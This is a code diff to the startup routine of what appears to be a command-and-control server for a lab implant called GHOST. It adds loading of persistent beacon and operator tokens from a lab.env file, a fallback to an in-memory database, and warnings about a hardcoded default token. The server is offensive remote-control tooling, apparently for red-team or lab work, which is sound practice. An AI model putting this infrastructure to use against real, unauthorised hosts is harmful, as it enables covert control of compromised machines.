@@ -2249,6 +2249,36 @@ def main():
                         "the implant always speaks HTTPS.")
     args = p.parse_args()
 
+    # Permanent lab secrets. simpleserver.sh writes server/lab/lab.env once and
+    # reuses it forever, so a server started by hand sees the same tokens the
+    # implant was built with — the alternative was pasting tokens on every start
+    # and silently mismatching them. Precedence: shipped defaults < this file <
+    # --config < environment < CLI flags.
+    lab_env = os.path.join(os.path.dirname(os.path.abspath(__file__)), "lab", "lab.env")
+    lab_env_used = False
+    if os.path.isfile(lab_env):
+        loaded: dict[str, str] = {}
+        try:
+            with open(lab_env, "r", encoding="utf-8") as fh:
+                for line in fh:
+                    line = line.strip()
+                    if not line or line.startswith("#") or "=" not in line:
+                        continue
+                    k, v = line.split("=", 1)
+                    loaded[k.strip()] = v.strip()
+        except OSError:
+            loaded = {}
+        for env_key, cfg_key in (("GHOST_BEACON_TOKEN",     "beacon_token"),
+                                 ("GHOST_OPERATOR_TOKEN",   "operator_token"),
+                                 ("GHOST_DASHBOARD_USER",   "dashboard_user"),
+                                 ("GHOST_DASHBOARD_PASS",   "dashboard_pass"),
+                                 ("GHOST_DB_PATH",          "db_path")):
+            if cfg_key in _ENV_SET:          # a real environment variable wins
+                continue
+            if loaded.get(env_key):
+                _CFG[cfg_key] = loaded[env_key]
+                lab_env_used = True
+
     if args.config:
         for k, v in _load_config_file(args.config).items():
             if k not in _ENV_SET:
@@ -2264,7 +2294,17 @@ def main():
     _CFG["auto_accept"]     = args.auto_accept or bool(_CFG["auto_accept"])
 
     # Config resolution is complete: move the store onto the chosen database.
-    _reopen_store(_CFG["db_path"])
+    # A path the store cannot open must not take the server down — a lab that
+    # still runs on the in-memory store beats one that refuses to start — but it
+    # says so loudly, because it means history will not survive a restart.
+    try:
+        _reopen_store(_CFG["db_path"])
+    except Exception as exc:                       # sqlite3.OperationalError, OSError, ...
+        print(f"{_YELLOW}[!] cannot open database {_CFG['db_path']!r}: {exc}{_RESET}")
+        print(f"{_YELLOW}[!] falling back to the in-memory store — "
+              f"sessions, results and the audit trail will NOT survive a restart{_RESET}")
+        _CFG["db_path"] = ":memory:"
+        _reopen_store(":memory:")
 
     threading.Thread(target=_janitor,        daemon=True).start()
     threading.Thread(target=_status_printer, daemon=True).start()
@@ -2281,6 +2321,12 @@ def main():
         print(f"  {_GREY}            use --db <path> or ./simpleserver.sh to persist{_RESET}")
     else:
         print(f"  Store     : {_GREEN}{_CFG['db_path']}{_RESET}")
+    if lab_env_used:
+        print(f"  Secrets   : {_GREY}{lab_env}{_RESET}")
+    if _CFG["beacon_token"] in ("change-me-beacon", "a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260") \
+       or _CFG["operator_token"] == "change-me-operator":
+        print(f"  {_YELLOW}[!] using a shipped default token — run ./simpleserver.sh up once "
+              f"to generate permanent lab tokens, then rebuild the implant{_RESET}")
     if args.auto_accept:
         print(f"  Auto-accept: {_GREEN}ON{_RESET}")
     print(f"\n  {_GREY}Next step: point the implant's GetC2Host() at this host{_RESET}")
